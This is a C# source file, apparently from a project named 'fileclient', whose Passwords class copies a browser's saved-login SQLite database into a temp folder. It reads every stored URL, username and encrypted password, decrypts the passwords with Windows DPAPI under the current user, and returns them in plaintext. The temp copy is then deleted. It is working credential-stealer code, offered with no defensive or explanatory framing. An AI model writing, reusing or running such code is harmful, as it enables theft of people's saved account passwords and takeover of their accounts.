using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Principal;
using System.Text;
using System.Security.Cryptography;

namespace fileclient
{
    class Passwords
    {
        static string temp = Path.GetTempPath();

        static public IEnumerable<Tuple<string, string, string>> ReadPass(string dbPath)
        {
            string username = WindowsIdentity.GetCurrent().Name;
            string workdir = Path.Combine(temp, username);

            if (!Directory.Exists(workdir))
            {
                Directory.CreateDirectory(workdir);
            }

            string tempDbPath = Path.Combine(workdir, "temp_login_data.db");

            if (File.Exists(tempDbPath))
            {
                File.Delete(tempDbPath);
            }

            File.Copy(dbPath, tempDbPath);

            var results = new List<Tuple<string, string, string>>();

            var connectionString = "Data Source=" + tempDbPath + ";pooling=false";
            using (var conn = new System.Data.SQLite.SQLiteConnection(connectionString))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = "SELECT password_value, username_value, origin_url FROM logins";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        try
                        {
                            var encryptedData = (byte[])reader[0];

                            if (encryptedData != null && encryptedData.Length > 0)
                            {
                                var decodedData = ProtectedData.Unprotect(encryptedData, null, DataProtectionScope.CurrentUser);
                                var plainText = Encoding.UTF8.GetString(decodedData);

                                string url = reader.GetString(2);
                                string username_val = reader.GetString(1);

                                if (!string.IsNullOrEmpty(plainText))
                                {
                                    results.Add(Tuple.Create(url, username_val, plainText));
                                }
                            }
                        }
                        catch
                        {
                            continue;
                        }
                    }
                }
                conn.Close();
            }

            try
            {
                File.Delete(tempDbPath);
            }
            catch { }

            foreach (var item in results)
            {
                yield return item;
            }
        }
    }
}
